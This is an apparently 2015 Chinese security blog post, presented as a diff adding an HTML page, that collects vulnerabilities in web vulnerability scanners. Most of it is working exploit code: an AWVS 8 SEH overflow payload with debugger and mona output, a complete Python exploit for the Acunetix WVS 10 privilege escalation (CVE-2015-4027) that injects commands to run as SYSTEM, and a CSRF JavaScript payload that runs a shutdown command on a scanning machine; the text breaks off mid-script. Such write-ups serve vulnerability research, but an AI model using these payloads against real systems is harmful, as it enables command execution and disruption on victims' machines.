@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="robots" content="index,follow" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="author" content="Chu" />
+        <meta name="description" content="Chu 的博客" />
+        <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+        <title>扫描器之殇 - Chu&#39;s BLoG</title>
+
+        
+		
+		
+        <link rel="stylesheet" href="/css/main.5d65992f9b793fc8ef4d51468c16f848fbe23ebfca8a5cd9508abf8cc4389cc7.css" integrity="sha256-XWWZL5t5P8jvTVFGjBb4SPviPr/KilzZUIq/jMQ4nMc=" />
+        <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+    </head>
+
+    <body>
+        <header></header>
+        <main>
+<article>
+    <header>
+        <h1>扫描器之殇</h1>
+        <div>
+            <time datetime="2015-12-11 11:34:57 +0800 CST">发布时间: 2015-12-11 11:34</time>
+            <time datetime="2015-12-11 11:34:57 +0800 CST">更新时间: 2015-12-11 11:34</time>
+        </div>
+    </header>
+
+    <section>
+    <p>昨天 sqlmap 又爆出了代码执行的漏洞，之前 AWVS 也爆过一些漏洞，原理各不相同一起整理下。</p>
+<h2 id="awvs-8-build-20120704-栈溢出">AWVS 8 build 20120704 栈溢出</h2>
+<p>问题出在 WVS 扫描初始化阶段：WVS 在扫描初始化阶段会自动分析目标的首页并将其列出，如下图：</p>
+<p><img src="" alt="the image is lost"></p>
+<p>当外部域名长度大于 268 时，WVS 就会崩溃，编写 POC 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAA[300 A]AAAAA.com/1.jpg&#34;</span>&gt;
+</span></span></code></pre></div><p>WinDbg 中跟一下发现崩溃发生于如下指令：</p>
+<pre tabindex="0"><code>00405944 8b4af8          mov     ecx,dword ptr [edx-8] ds:0023:41414139=????????
+</code></pre><p>edx 被 AAAA 覆盖，mona 生成定位字符串，可以看到 SEH 覆盖长度为 280，继续使用 mona 获取 p/p/r 地址：</p>
+<pre tabindex="0"><code>!py mona seh -cp alphanum						// 因为域名中字符限制为0-9a-Z，-
+0x00414e54 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [wvs.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0.3452 (D:\Program Files\Acunetix\Web Vulnerability Scanner 8\wvs.exe)
+0x00426133 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [wvs.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0.3452 (D:\Program Files\Acunetix\Web Vulnerability Scanner 8\wvs.exe)
+0x00476d39 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [wvs.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0.3452 (D:\Program Files\Acunetix\Web Vulnerability Scanner 8\wvs.exe)
+0x00486f76 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [wvs.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.0.0.3452 (D:\Program Files\Acunetix\Web Vulnerability Scanner 8\wvs.exe)
+... snip ...
+0x74643371 : pop edi # pop esi # ret 0x08 | asciiprint,ascii,alphanum,lowernum {PAGE_EXECUTE_READ} [msls31.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v3.10.349.0 (C:\WINDOWS\system32\msls31.dll)			// 可用的 p/p/r
+... snip ...
+</code></pre><p>NEXT SEH 也应该覆盖成 alphanum 字符，这里可以观察到 CF 位为 0，故而使用 JNB 做小跳 JNB 50 =&gt; <code>\x73\x50</code>，不足 4 位添加 AA 补全。最终构造 POC 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsPAAq3dtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.com/1.jpg&#34;</span>&gt;
+</span></span></code></pre></div><p>可以看到成功跳到 shellcode（BBBB）中：</p>
+<p><img src="" alt="the image is lost"></p>
+<h2 id="acunetix-wvs-10---local-privilege-escalation">Acunetix WVS 10 - Local Privilege escalation</h2>
+<p>WVS 9 以后的版本会安装名为 AcuWVSSchedulerv10 的自启动服务，监听本地8183 端口，用户可以通过它来为 AWVS 添加新的扫描任务。此接口实际上是调用 wvs_console.exe 来执行扫描任务的，并且下发任务时参数是通过拼接字符串实现的。而 wvs_console.exe 提供了 /Run 参数用来在爬行的过程中执行用户自定义的命令。由此两点直接导致了 WVS 的命令执行漏洞：</p>
+<p><img src="" alt="the image is lost"></p>
+<p>POC 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">========================================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Acunetix WVS 10 - from guest to Sytem (Local privilege escalation)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">CVE: CVE-2015-4027
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Author: (me) Daniele Linguaglossa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Affected Product: Acunetix WVS 10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Exploit: Local privilege escalation
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Vendor: Acunetix ltd
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Remote: No
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Version: 10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">=========================================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">A local privilege escalation exists in Acunetix  WVS 10, it allow
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">a local user (even guest) to gain same privilege as System user.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">With default Acunetix installation, a service called &#34;AcuWVSSchedulerv10&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">will be installed, this service run as local system user.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AcuWVSSchedulerv10 is reponsable for scan scheduling without user interaction
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">it expose some API to interact via a web server usually localhost:8183.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">API:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/listScan
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/addScan &lt;== vulnerable one
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/deleteScan
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">etc...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">When a user schedule a scan API &#34;addScan&#34; will be called as following
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-------------------------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api/addScan HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8183
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept: application/json, text/javascript, */*; q=0.01
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept-Encoding: gzip, deflate
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/json; charset=UTF-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RequestValidated: true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">X-Requested-With: XMLHttpRequest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Referer: http://localhost:8183/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 452
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: keep-alive
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pragma: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cache-Control: no-cache
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;scanType&#34;: &#34;scan&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;targetList&#34;: &#34;&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;target&#34;: [&#34;http://.target.it&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;recurse&#34;: &#34;-1&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;date&#34;: &#34;12/2/2015&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;dayOfWeek&#34;: &#34;1&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;dayOfMonth&#34;: &#34;1&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;time&#34;: &#34;12:21&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;deleteAfterCompletion&#34;: &#34;False&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;params&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;profile&#34;: &#34;Default&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;loginSeq&#34;: &#34;&lt;none&gt;&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;settings&#34;: &#34;Default&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;scanningmode&#34;: &#34;heuristic&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;excludedhours&#34;: &#34;&lt;none&gt;&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;savetodatabase&#34;: &#34;True&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;savelogs&#34;: &#34;False&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;generatereport&#34;: &#34;False&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;reportformat&#34;: &#34;PDF&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;reporttemplate&#34;: &#34;WVSAffectedItemsReport.rep&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;emailaddress&#34;: &#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">------------------------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The first thing i noticed was the reporttemplate, this was used to create report
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">when scanning ends, so it means an external file wich we can control will be then
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">used by System! this would be interesting enough but i never look deep into.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Instead i noticed something even worst, filename was used as argument to wvs.exe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">called with system privilege!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">By looking at how Acunetix handled reporttemplate argument i figured out that was
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">possibile to inject custom arguments within reporttemplate, now this is where
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Acunetix help us :D in fact wvs was provided with an interesting argument it was
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/Run as reference says:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">https://www.acunetix.com/blog/docs/acunetix-wvs-cli-operation/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Run a command line command during the crawl.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Syntax: /Run [command]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Example: /Run curl http://example.com/dir1/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Wow that&#39;s really nice, so in order to execute a command we must insert a fake
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Crawl followed by a Run command so reporttemplate become:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;reporttemplate&#34;: &#34;WVSAffectedItemsReport.rep /Craw http://fakesite.it /Run cmd.exe&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">it worked cmd runned as System!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">==================================================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Now let&#39;s pwn this!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">escalation.py
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> httplib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> gmtime, strftime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COMMAND <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;cmd.exe&#34;</span>
+</span></span><span style="display:flex;"><span>ACUHOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
+</span></span><span style="display:flex;"><span>ACUPORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">8183</span>
+</span></span><span style="display:flex;"><span>ACUHEADERS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json; charset=UTF-8&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;X-Requested-With&#34;</span>: <span style="color:#e6db74">&#34;XMLHttpRequest&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;application/json, text/javascript, */*; q=0.01&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;RequestValidated&#34;</span>: <span style="color:#e6db74">&#34;true&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>ACUEXPLOIT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/Crawl http://www.google.it /Run </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span> COMMAND <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>ACUDATA <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;scanType&#34;</span>:<span style="color:#e6db74">&#34;scan&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;targetList&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;target&#34;</span>:[<span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2048</span>],
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;recurse&#34;</span>:<span style="color:#e6db74">&#34;-1&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;date&#34;</span>:strftime(<span style="color:#e6db74">&#34;%m/</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">/%Y&#34;</span>, gmtime()),
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;dayOfWeek&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;dayOfMonth&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;time&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>hour, datetime<span style="color:#f92672">.</span>now()<span style="color:#f92672">.</span>minute<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>),
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;deleteAfterCompletion&#34;</span>:<span style="color:#e6db74">&#34;False&#34;</span>,
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">&#34;params&#34;</span>:{<span style="color:#e6db74">&#34;profile&#34;</span>:<span style="color:#e6db74">&#34;Default&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;loginSeq&#34;</span>:<span style="color:#e6db74">&#34;&lt;none&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;settings&#34;</span>:<span style="color:#e6db74">&#34;Default&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;scanningmode&#34;</span>:<span style="color:#e6db74">&#34;heuristic&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;excludedhours&#34;</span>:<span style="color:#e6db74">&#34;&lt;none&gt;&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;savetodatabase&#34;</span>:<span style="color:#e6db74">&#34;True&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;savelogs&#34;</span>:<span style="color:#e6db74">&#34;False&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;generatereport&#34;</span>:<span style="color:#e6db74">&#34;False&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;reportformat&#34;</span>:<span style="color:#e6db74">&#34;PDF&#34;</span>,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;reporttemplate&#34;</span>:<span style="color:#e6db74">&#34;WVSDeveloperReport.rep &#34;</span> <span style="color:#f92672">+</span> ACUEXPLOIT,
+</span></span><span style="display:flex;"><span>                     <span style="color:#e6db74">&#34;emailaddress&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>           }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sendExploit</span>():
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> httplib<span style="color:#f92672">.</span>HTTPConnection(ACUHOST, ACUPORT)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>request(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;/api/addScan&#34;</span>, json<span style="color:#f92672">.</span>dumps(ACUDATA), ACUHEADERS)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>getresponse()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (resp<span style="color:#f92672">.</span>status, resp<span style="color:#f92672">.</span>reason)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Acunetix Wvs 10 Local priviledge escalation by Daniele Linguaglossa</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;[+] Command : </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> will be executed as SYSTEM&#34;</span> <span style="color:#f92672">%</span> COMMAND
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;[+] Sending exploit...&#34;</span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;[+] Result: &#34;</span><span style="color:#f92672">+</span>sendExploit()
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;[+] Done!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============================================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">I hope this write-up was funny enough anyway i really would like to thank
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Acunetix product manager N.S. for the really fast answer and bug mitigation,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">right now a patch exists so hurry up download it now.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============================================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span></code></pre></div><p>而此漏洞可以通过 CSRF 来触发，即：黑客通过 WVS 扫描你网站时通过页面中的 CSRF 自动发 POC，这使其由本地权限提升扩展成了远程代码执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getFullYear</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getMonth</span>()<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getDate</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hours</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getHours</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getMinutes</span>()<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;shutdown -r -t 0&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">padding</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2048</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)<span style="color:#a6e22e">padding</span><span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;a&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">exp</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;scanType&#34;:&#34;scan&#34;,&#34;targetList&#34;:&#34;&#34;,&#34;target&#34;:[&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">padding</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;],&#34;recurse&#34;:&#34;-1&#34;,&#34;date&#34;:&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">m</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">d</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">y</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;,&#34;dayOfWeek&#34;:&#34;1&#34;,&#34;dayOfMonth&#34;:&#34;1&#34;,&#34;time&#34;:&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">hours</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;:&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">min</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;,&#34;deleteAfterCompletion&#34;:&#34;False&#34;,&#34;params&#34;:{&#34;profile&#34;:&#34;Default&#34;,&#34;loginSeq&#34;:&#34;&lt;none&gt;&#34;,&#34;settings&#34;:&#34;Default&#34;,&#34;scanningmode&#34;:&#34;heuristic&#34;,&#34;excludedhours&#34;:&#34;&lt;none&gt;&#34;,&#34;savetodatabase&#34;:&#34;True&#34;,&#34;savelogs&#34;:&#34;False&#34;,&#34;generatereport&#34;:&#34;False&#34;,&#34;reportformat&#34;:&#34;PDF&#34;,&#34;reporttemplate&#34;:&#34;WVSDeveloperReport.rep /Crawl http://www.google.it /Run \\&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">command</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39; \\&#34;&#34;,&#34;emailaddress&#34;:&#34;&#34;}}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(window.<span style="color:#a6e22e">XMLHttpRequest</span>){
